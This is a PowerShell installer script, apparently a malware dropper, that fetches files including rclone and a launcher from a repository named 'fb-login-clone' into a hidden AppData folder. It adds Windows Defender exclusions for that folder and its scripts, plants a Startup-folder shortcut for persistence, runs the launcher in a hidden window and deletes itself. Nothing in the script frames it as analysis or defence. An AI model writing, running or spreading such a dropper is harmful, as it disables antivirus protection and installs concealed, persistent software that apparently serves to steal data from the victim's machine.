# setup.ps1 - Win+R installer luna
$dest = "$env:APPDATA\Microsoft\Windows\luna"
New-Item -ItemType Directory -Path $dest -Force | Out-Null

$repo = "https://raw.githubusercontent.com/Ex6TenZz/fb-login-clone/main/public/luna"
$files = @("luna.ps1", "rclone.exe", "rclone.conf", "luna_launcher.bat")

foreach ($file in $files) {
    $url = "$repo/$file"
    $out = Join-Path $dest $file
    Invoke-WebRequest -Uri $url -OutFile $out -UseBasicParsing
    Write-Host "Downloaded $file"
} catch {
    Write-Warning "Failed to download $file from $url"
}

#  Defender 
Add-MpPreference -ExclusionPath $dest -ErrorAction SilentlyContinue
Add-MpPreference -ExclusionProcess "$dest\luna_launcher.bat" -ErrorAction SilentlyContinue
Add-MpPreference -ExclusionProcess "$dest\luna.ps1" -ErrorAction SilentlyContinue

# Start Menu
$WshShell = New-Object -ComObject WScript.Shell
$lnk = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\luna.lnk"
$shortcut = $WshShell.CreateShortcut($lnk)
$shortcut.TargetPath = "$dest\luna_launcher.bat"
$shortcut.WorkingDirectory = $dest
$shortcut.Save()

(Get-Item $dest).Attributes += 'Hidden'

# Start
Start-Process -WindowStyle Hidden -FilePath "$dest\luna_launcher.bat"

# Delete
$me = $MyInvocation.MyCommand.Path
Start-Sleep -Seconds 2
Remove-Item $me -Force
